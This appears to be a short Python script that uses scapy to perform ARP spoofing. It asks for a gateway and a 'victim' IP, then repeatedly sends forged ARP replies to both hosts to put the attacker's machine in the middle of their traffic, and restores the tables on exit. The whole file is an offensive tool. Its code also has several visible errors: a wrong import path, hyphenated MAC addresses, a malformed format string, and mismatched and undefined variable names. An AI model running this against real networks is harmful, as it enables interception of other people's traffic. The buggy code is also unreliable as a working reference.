from scapy.all import *
from time import sleep
from scapy.layer.l2 import Ether, ARP

def getMAC(ip):
    ans, unans = srp(Ether(dst='ff-ff-ff-ff-ff-ff')/ARP(pdst=ip),timeout=5,retry=3)
    for s, r in ans:
        return r.sprintf('Ether.src%')

def poisonARP(srcip, targtip, targetmac):
    arp=ARP(op=2, psrc=srcip,pdst=targetip,hwdst=targetmac)
    send(arp)
    
def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    arp1=ARP(op=2, pdst=victimip,psrc=gatewayip,hwdst='ff-ff-ff-ff-ff-ff',hwsrc=gatewaymac)
    arp2=ARP(op=2, pdst=gatewayip,psrc=victimip,hwdst='ff-ff-ff-ff-ff-ff',hwsrc=victimmac)
    send(arp1,count=3)
    send(arp2,count=3)

def main():
    gatewayip = input('Plz input ur ip')
    victimip = input('Plz input victim ip')

    victimmac = getMAC(victimip)
    gatewaymac = getMAC(gatewayip)

    if(victimac == None or gatewaymac == None):
        print("Sry i cant find MacAdress :(")
        return

    print('Starting ARP Spoofing -> Victim IP [%s]' %victimip)
    print('[%s]: POISON ARP table [%s] -> [%s]' %(victimip,gatewaymac,victimmac))

    try:
        while True:
            poisonARP(gatewayip,victimip,victimmac)
            poisonARP(victimip,gatewayip,gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimip,gatewayip,victimmac,gatewaymac)
        print('Shutting Down ARP Spoofing -> RESTORED ARP table')


if __name__ == '__main__':
    main()
